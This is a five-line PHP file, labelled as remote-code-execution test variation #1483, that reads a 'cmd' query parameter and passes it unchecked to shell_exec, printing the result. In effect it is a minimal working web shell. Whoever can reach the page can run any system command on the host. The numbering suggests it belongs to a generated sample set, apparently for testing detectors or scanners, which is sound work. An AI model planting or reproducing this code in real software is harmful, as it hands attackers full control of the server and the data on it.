<?php
// RCE test variation #1483
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>